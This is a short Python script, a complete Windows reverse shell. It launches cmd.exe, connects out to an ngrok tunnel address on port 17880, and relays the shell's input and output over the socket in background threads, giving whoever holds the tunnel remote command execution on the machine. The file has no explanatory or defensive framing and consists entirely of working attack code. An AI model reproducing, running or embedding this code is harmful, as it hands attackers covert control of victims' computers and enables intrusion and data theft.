import socket
import os
import threading
import subprocess as sp

# Create a subprocess running cmd.exe
p = sp.Popen(['cmd.exe'], stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.STDOUT)

# Create a socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('0.tcp.eu.ngrok.io', 17880))

# Function to send output from subprocess to the socket
def send_output():
    while True:
        o = os.read(p.stdout.fileno(), 1024)
        s.send(o)

# Function to send input from the socket to the subprocess
def send_input():
    while True:
        i = s.recv(1024)
        os.write(p.stdin.fileno(), i)

# Start the threads
threading.Thread(target=send_output, daemon=True).start()
threading.Thread(target=send_input, daemon=True).start()

# Keep the main thread alive to prevent the program from exiting immediately
while True:
    pass
